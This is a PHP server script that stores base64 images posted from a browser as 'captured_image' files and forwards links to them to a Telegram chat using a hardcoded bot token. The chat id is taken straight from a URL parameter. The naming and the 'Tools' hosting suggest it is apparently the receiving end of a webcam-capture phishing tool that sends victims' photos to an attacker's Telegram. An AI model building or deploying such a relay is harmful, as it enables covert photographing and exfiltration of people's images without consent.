<?php
// Check if the request is a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Receive the image data from the client-side JavaScript
    $postData = file_get_contents('php://input');
    $data = json_decode($postData);

    if ($data && isset($data->image)) {
        $imageData = $data->image;
        $imageData = str_replace('data:image/jpeg;base64,', '', $imageData);
        $imageData = base64_decode($imageData);

        // Directory where you want to store the images (adjust the path as needed)
        $uploadDirectory = 'uploads/';

        // Create the directory if it doesn't exist
        if (!is_dir($uploadDirectory)) {
            mkdir($uploadDirectory, 0755, true);
        }

        // Extract the API parameter from the URL
        $api = $_GET['api'];

        // Generate a unique filename
        $filename = 'captured_image_' . time() . '.jpg';
        $filePath = $uploadDirectory . $filename;

        // Save the image to the specified directory
        if (file_put_contents($filePath, $imageData)) {
            echo 'Image saved successfully.';

            // Set the chat_id using the API parameter
            $chat_id = $api; // Assuming the API parameter contains the chat_id

            // Send the image link to the Telegram API
            $img_url = 'https://ahmhabib01.github.io/Tools/' . $filePath; // Update with your website's URL
            $telegramUrl = 'https://api.telegram.org/7298508024:AAFhwV60CiHQEJOM7f0FGClpax0idI9E-vg/sendPhoto?chat_id=' . $chat_id . '&parse_mode=HTML&disable_web_page_preview=false&photo=' . $img_url;

            // Use cURL to send the request
            $ch = curl_init($telegramUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
        } else {
            echo 'Failed to save the image.';
        }
    } else {
        echo 'Image data not received.';
    }
} else {
    echo 'Invalid request method.';
}
?>
